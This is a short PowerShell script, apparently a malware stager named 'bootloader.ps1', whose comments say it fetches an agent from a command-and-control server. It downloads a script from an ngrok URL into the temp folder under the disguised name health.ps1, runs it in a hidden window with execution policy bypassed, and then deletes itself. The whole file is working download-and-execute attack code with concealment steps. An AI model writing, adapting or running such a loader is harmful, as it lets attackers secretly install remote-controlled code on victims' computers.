#Get agent.ps1 from c2
#execute agent.ps1: Complete
$c2 = "https://promptly-kind-anchovy.ngrok-free.app/entrypoint"
$dest = "$env:TEMP\health.ps1"

# Download the file
Invoke-WebRequest -Uri $c2 -OutFile $dest
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $dest" -WindowStyle Hidden -PassThru
Remove-Item -Path "bootloader.ps1"
